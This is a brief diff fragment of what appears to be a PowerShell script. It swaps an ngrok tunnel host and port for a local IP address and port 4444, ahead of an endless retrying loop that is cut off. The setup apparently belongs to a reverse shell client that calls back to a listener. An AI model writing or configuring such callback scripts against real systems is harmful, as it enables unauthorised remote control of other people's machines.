@@ -1,5 +1,5 @@
-$ip = "4.tcp.eu.ngrok.io"
-$port = 16697
+$ip = "192.168.1.16"
+$port = 4444
 
 while ($true) {
     try {
